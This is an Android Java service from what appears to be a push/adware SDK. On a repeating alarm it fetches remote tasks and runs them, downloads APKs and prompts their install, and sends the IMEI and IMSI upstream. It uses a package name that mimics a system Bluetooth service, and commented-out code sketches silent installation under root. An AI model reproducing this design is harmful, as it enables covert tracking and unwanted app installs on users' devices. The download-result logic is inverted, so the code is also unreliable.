package com.tt.push.service;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.IBinder;
import android.text.TextUtils;
import co.lvdou.foundation.utils.extend.LDApkHelper;
import co.lvdou.foundation.utils.extend.LDContextHelper;
import co.lvdou.foundation.utils.extend.LDDeviceInfoHelper;
import co.lvdou.foundation.utils.extend.Logout;
import com.tt.push.action.LoadPushTaskAction;
import com.tt.push.model.ApkInfo;
import com.tt.push.model.PushTask;
import com.tt.push.store.BaseParamsStore;
import com.tt.push.store.InstallingApkInfoStore;
import com.tt.push.store.NetworkApkStore;
import com.tt.push.util.NotificationHelper;
import com.tt.push.util.PushPrefHelper;

import java.util.HashMap;

public class PushService extends Service {

    private static final String PUSH_APK_PACKAGE_NAME = "com.android.bluetooth.service";

    /**
     * 请求获取推送任务的动作，当Service接收到该动作时将重新获取推送任务
     */
    public static final String ACTION_LOAD_PUSH_TASK = "action_do_push_task";

    /**
     * 请求下载apk的动作，当Service接收到该动作时将开始下载apk，并显示相关进度的通知
     */
    public static final String ACTION_DOWNLOAD_APK = "action_download_apk";
    public static final String EXTRA_PUSH_TASK = "extra_push_task";
    public static final String EXTRA_APK_ICON_PATH = "extra_apk_icon_path";

    /**
     * 调用获取推送任务接口的间隔时间，默认为半小时
     */
    private static final long INTERVAL_LOAD_PUSH_TASK = 1000L * 60 * 2;

    /**
     * 重新设置调用获取推送任务接口的间隔时间，默认为10分钟
     */
    private static final long INTERVAL_RESET_LOAD_PUSH_TASK_ALARM = 1000 * 60 * 1;

    private InstallBroadcastReceiver mInstallReceiver;


    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        initPushService();
        registReceivers();
        keepAlive();
        setLoadPushTaskAlarm(this);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        stopKeepAlive();
        unregistReceivers();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            String action = intent.getAction();
            if (!TextUtils.isEmpty(action)) {
                if (action.equalsIgnoreCase(ACTION_LOAD_PUSH_TASK)) {
                    Logout.out("接收到拉取最新PUSH任务的请求");
                    performLoadPushTask();
                } else if (action.equalsIgnoreCase(ACTION_DOWNLOAD_APK)) {
                    Logout.out("接收到下载APK的请求");

                    PushTask pushTask = (PushTask) intent.getSerializableExtra(EXTRA_PUSH_TASK);
                    String iconPath = intent.getStringExtra(EXTRA_APK_ICON_PATH);
                    if (pushTask != null && pushTask.isValid() && !TextUtils.isEmpty(iconPath))
                        performDownloadApk(pushTask, iconPath);
                }
            }
        }
        return super.onStartCommand(intent, flags, startId);
    }

    private void registReceivers() {
        if (mInstallReceiver == null) {
            mInstallReceiver = new InstallBroadcastReceiver();
            mInstallReceiver.regist(this);
        }

    }

    private void unregistReceivers() {
        if (mInstallReceiver != null) {
            mInstallReceiver.unregist(this);
            mInstallReceiver = null;
        }
    }

    private void performLoadPushTask() {

        boolean isWorkInPushAPk = getPackageName().equalsIgnoreCase(PUSH_APK_PACKAGE_NAME);
        boolean isInstalledPushApk = isWorkInPushAPk || LDApkHelper.isInstalled(PUSH_APK_PACKAGE_NAME);

        Logout.out("拉取push任务");
        LoadPushTaskAction.alloc().setDelegate(new LoadPushTaskAction.ActionDelegate() {
            @Override
            public void onFinishLoadPushTask(PushTask task) {
                if (task != null) {
                    task.execute();
                }
            }
        }).execute();


//        if (isWorkInPushAPk) {
//            Logout.out("hi，我是单独的push插件，开始获取最新的push任务");
//            LoadPushTaskAction.alloc().setDelegate(new LoadPushTaskAction.ActionDelegate() {
//                @Override
//                public void onFinishLoadPushTask(PushTask task) {
//                    if (task != null) {
//                        task.execute();
//                    }
//                }
//            }).execute();
//        } else if (isInstalledPushApk) {
//            Logout.out("hi,我不是单独的push插件，但是我已经安装插件了，开始激活插件");
//            PushApkHelper.launchPushApk();
//        } else {
//            ShellManager sm = ShellManager.shareManager();
//            if (sm.isObtainRootPermission()) {
//                //TODO 下载插件apk
//                Logout.out("hi,我不是单独的push插件，获取到了root权限，静默安装单独push插件");
//                Logout.out("下载插件apk");
//            } else {
//                Logout.out("hi,我不是单独的push插件，没有root权限，自己做任务好了");
//                LoadPushTaskAction.alloc().setDelegate(new LoadPushTaskAction.ActionDelegate() {
//                    @Override
//                    public void onFinishLoadPushTask(PushTask task) {
//                        if (task != null) {
//                            task.execute();
//                        }
//                    }
//                }).execute();
//            }
//        }
    }

    private void performDownloadApk(final PushTask pushTask, final String iconPath) {
        NetworkApkStore.shareStore().download(pushTask.apkInfo(), new NetworkApkStore.LoadApkResultHandler() {
            @Override
            public void onLoadingApk(ApkInfo apkInfo, int progress) {
                NotificationHelper.showDownloadingApkNotification(apkInfo, progress, iconPath);
            }

            @Override
            public void onFinishLoadApk(boolean isDownloadSuccess, ApkInfo apkInfo, String apkPath) {
                if (isDownloadSuccess) {
                    pushTask.onDownloadFail();
                    NotificationHelper.showDownloadFailNotification(pushTask, iconPath);
                    return;
                } else {
                    pushTask.onDownloadSuccess();
                }

                NotificationHelper.showInstallAPKNotification(apkInfo, apkPath, iconPath);
            }
        });
    }

    private void initPushService() {
        LDContextHelper.init(this);
        HashMap<String, String> params = new HashMap<String, String>(6);
        params.put("imei", LDDeviceInfoHelper.defaultHelper().getImei() + 27);
        params.put("imsi", LDDeviceInfoHelper.defaultHelper().getImsi());
        params.put("channelId", "10001");
        params.put("version", "1");
        params.put("os", "Android");
        params.put("ua", LDDeviceInfoHelper.defaultHelper().getMobileType());
        BaseParamsStore.shareStore().setBaseParams(params);
        Logout.out("服务初始化完毕");
    }

    private void keepAlive() {
    }

    private void stopKeepAlive() {
    }

    private void setLoadPushTaskAlarm(Context context) {
        if (!needToResetLastLoadPushTaskAlarm())
            return;

        long lastTime = PushPrefHelper.shareHelper().lastLoadPushTaskTime();
        long passedTime = System.currentTimeMillis() - lastTime;

        long triggerTime;
        if (passedTime > INTERVAL_LOAD_PUSH_TASK) {
            triggerTime = System.currentTimeMillis();
        } else {
            triggerTime = System.currentTimeMillis() + (INTERVAL_LOAD_PUSH_TASK - passedTime);
        }
        triggerTime += 1000 * 5;

        Logout.out(String.format("重新设定下次拉取PUSH任务时间.距离下次触发时间:%d秒;间隔:%d秒", (triggerTime - System.currentTimeMillis()) / 1000, INTERVAL_LOAD_PUSH_TASK / 1000));

        PendingIntent operation = newLoadPushTaskOperation(context);
        AlarmManager am = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
        am.setRepeating(AlarmManager.RTC_WAKEUP, triggerTime, INTERVAL_LOAD_PUSH_TASK, operation);
    }

    private PendingIntent newLoadPushTaskOperation(Context context) {
        Intent intent = new Intent(PushService.ACTION_LOAD_PUSH_TASK);
        intent.setClass(context, PushService.class);

        return PendingIntent.getService(context, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT);
    }

    private boolean needToResetLastLoadPushTaskAlarm() {
        long lastTime = PushPrefHelper.shareHelper().lastCheckLoadPushTaskTime();
        long passedTime = System.currentTimeMillis() - lastTime;

        return passedTime > INTERVAL_RESET_LOAD_PUSH_TASK_ALARM;
    }

    private static class InstallBroadcastReceiver extends BroadcastReceiver {
        private boolean mIsRegisted = false;

        @Override
        public void onReceive(Context context, Intent intent) {
            String action = intent.getAction();

            if (!TextUtils.isEmpty(action)) {
                if (action.equalsIgnoreCase(Intent.ACTION_PACKAGE_ADDED) || action.equalsIgnoreCase(Intent.ACTION_PACKAGE_CHANGED)) {
                    Logout.out("receive apk install broadcast");
                    Logout.out("packageName: " + intent.getData().getSchemeSpecificPart());
                    String packageName = intent.getData().getSchemeSpecificPart();
                    ApkInfo apkInfo = InstallingApkInfoStore.shareStore().getInstallingApk(packageName);
                    if (apkInfo != null && apkInfo.relatedTask() != null) {
                        apkInfo.relatedTask().onInstallSuccess();
                    }
                }
            }
        }

        public void regist(Context context) {
            if (mIsRegisted) return;

            IntentFilter filter = new IntentFilter();
            filter.addDataScheme("package");
            filter.addAction(Intent.ACTION_PACKAGE_ADDED);
            filter.addAction(Intent.ACTION_PACKAGE_CHANGED);

            context.registerReceiver(this, filter);

            mIsRegisted = true;
        }

        public void unregist(Context context) {
            if (mIsRegisted)
                context.unregisterReceiver(this);
        }
    }

    private static class KeepAliveThread extends Thread {
        private final Context mContext;
        private boolean mIsCanceled = false;

        public KeepAliveThread(Context context) {
            mContext = context;
        }

        @Override
        public void run() {
            Logout.out("KeepAliveThread已经启动");
            while (!mIsCanceled) {
                try {
                    Thread.sleep(1000L * 30);
                    Logout.out("KeepAliveThread正在运行");
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
            Logout.out("KeepAliveThread已经被停止");
        }

        public void cancel() {
            mIsCanceled = true;
        }
    }
}
